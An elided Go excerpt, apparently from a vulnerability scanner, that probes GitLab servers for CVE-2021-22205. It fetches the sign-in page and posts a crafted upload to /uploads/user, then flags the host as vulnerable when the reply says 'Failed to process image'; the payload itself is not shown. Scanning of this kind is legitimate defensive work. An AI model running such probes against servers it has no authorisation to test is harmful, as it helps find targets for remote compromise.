...
func CVE_2021_22205(url string) bool {
	if req, err := utils.HttpRequset(url+"/users/sign_in", "GET", "", false, nil); err == nil {
...
func upload(u string, cookie string, csrf string) bool {
	...
	if req, err := utils.HttpRequset(u+"/uploads/user", "POST", buf.String(), false, header); err == nil {
		if strings.Contains(req.Body, "Failed to process image") {
			log.Logger.Warn().Msg(fmt.Sprintf("Found vuln gitlab CVE_2021_22205|%s\n", u))
			return true
		}
	}
	return false
